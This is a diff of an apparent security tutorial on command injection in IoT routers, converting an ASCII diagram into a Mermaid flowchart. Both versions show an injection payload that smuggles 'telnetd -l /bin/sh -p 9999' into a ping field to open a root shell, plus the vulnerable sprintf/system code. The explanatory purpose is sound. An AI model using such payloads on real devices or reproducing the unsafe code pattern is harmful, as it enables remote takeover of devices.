@@ -112,42 +112,15 @@ If `nc` does not support `-e`, an attacker must use named pipes (FIFOs) to redir
 
 ## 6. Architecture of an IoT Web Injection (ASCII Diagram)
 
-```text
-  [ Attacker ]
-       |
-       | 1. HTTP POST /cgi-bin/diag.cgi
-       |    ip=8.8.8.8;telnetd -l /bin/sh -p 9999
-       v
- +---------------------------------------------------+
- | IoT Device (e.g., Home Router)                    |
- |                                                   |
- |  +-----------------------+                        |
- |  | Web Server (uHTTPd)   |  (Runs as root)        |
- |  +-----------------------+                        |
- |            | 2. Passes POST variable              |
- |            v                                      |
- |  +-----------------------+                        |
- |  | diag.cgi (C Binary)   |                        |
- |  |                       |                        |
- |  | sprintf(cmd,          |                        |
- |  | "ping -c 4 %s", ip);  |                        |
- |  | system(cmd);          |                        |
- |  +-----------------------+                        |
- |            | 3. Executes command string           |
- |            v                                      |
- |  +---------------------------------------------+  |
- |  | OS Shell (/bin/sh)                          |  |
- |  |                                             |  |
- |  | $ ping -c 4 8.8.8.8  (Executes normally)    |  |
- |  | $ telnetd -l /bin/sh -p 9999 (Malicious)    |  |
- |  +---------------------------------------------+  |
- |            |                                      |
- |            v                                      |
- |  +-----------------------+                        |
- |  | Telnet Daemon         | <--- 4. Listens on     |
- |  | (Root Privileges)     |      Port 9999         |
- |  +-----------------------+                        |
- +---------------------------------------------------+
+```mermaid
+flowchart TD
+    Attacker["[ Attacker ]"] -->|1. HTTP POST /cgi-bin/diag.cgi<br>ip=8.8.8.8;telnetd -l /bin/sh -p 9999| WebServer
+
+    subgraph IoT["IoT Device (e.g., Home Router)"]
+        WebServer["Web Server (uHTTPd)<br>(Runs as root)"] -->|2. Passes POST variable| CGI["diag.cgi (C Binary)<br>sprintf(cmd, 'ping -c 4 %s', ip);<br>system(cmd);"]
+        CGI -->|3. Executes command string| Shell["OS Shell (/bin/sh)<br>$ ping -c 4 8.8.8.8 (Executes normally)<br>$ telnetd -l /bin/sh -p 9999 (Malicious)"]
+        Shell -->|4. Listens on Port 9999| Telnet["Telnet Daemon<br>(Root Privileges)"]
+    end
 ```
 
 ## 7. Remediation and Secure Coding
